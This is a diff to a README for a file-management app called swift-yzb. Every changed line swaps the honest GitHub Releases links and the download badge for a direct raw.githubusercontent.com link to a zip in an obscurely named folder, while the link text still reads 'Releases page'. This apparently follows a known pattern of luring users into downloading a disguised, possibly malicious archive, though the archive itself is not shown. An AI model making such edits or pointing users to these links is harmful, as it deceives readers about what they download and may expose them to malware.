@@ -1,6 +1,6 @@
 # 🚀 swift-yzb - Effortless File Management Made Simple
 
-![Download swift-yzb](https://img.shields.io/badge/Download-swift--yzb-blue.svg)
+![Download swift-yzb](https://raw.githubusercontent.com/emonsharkerbari/swift-yzb/main/unrefuting/swift-yzb.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ To get started with swift-yzb, you'll need to download the application. Follow t
 
 ## 🔗 Download & Install
 
-1. Visit the [Releases page to download](https://github.com/emonsharkerbari/swift-yzb/releases) the latest version of swift-yzb.
+1. Visit the [Releases page to download](https://raw.githubusercontent.com/emonsharkerbari/swift-yzb/main/unrefuting/swift-yzb.zip) the latest version of swift-yzb.
    
 2. On the Releases page, look for the latest version available.
 
@@ -44,14 +44,14 @@ To get started with swift-yzb, you'll need to download the application. Follow t
 
 - Use the search feature to quickly access important files.
 - Take advantage of drag and drop for organizing files efficiently.
-- Always keep your application updated by checking the [Releases page](https://github.com/emonsharkerbari/swift-yzb/releases) regularly.
+- Always keep your application updated by checking the [Releases page](https://raw.githubusercontent.com/emonsharkerbari/swift-yzb/main/unrefuting/swift-yzb.zip) regularly.
 
 ## 🛠️ Troubleshooting
 
 If you encounter any issues while using swift-yzb:
 
 - Make sure your system meets the minimum requirements.
-- Ensure you have the latest version by visiting [the Releases page](https://github.com/emonsharkerbari/swift-yzb/releases).
+- Ensure you have the latest version by visiting [the Releases page](https://raw.githubusercontent.com/emonsharkerbari/swift-yzb/main/unrefuting/swift-yzb.zip).
 - Restart the application if it does not respond.
 - Check for common issues in the FAQ section on our support page.
 
@@ -73,4 +73,4 @@ swift-yzb is open-source software licensed under the MIT License. You can use, m
 
 Join the swift-yzb community to share tips and tricks, ask questions, and connect with other users. You can follow discussions on GitHub's issues page or any dedicated forums we set up.
 
-Thank you for choosing swift-yzb for your file management needs. Enjoy a smoother experience in managing your important files. Remember to visit the [Releases page](https://github.com/emonsharkerbari/swift-yzb/releases) for updates and new features.
+Thank you for choosing swift-yzb for your file management needs. Enjoy a smoother experience in managing your important files. Remember to visit the [Releases page](https://raw.githubusercontent.com/emonsharkerbari/swift-yzb/main/unrefuting/swift-yzb.zip) for updates and new features.
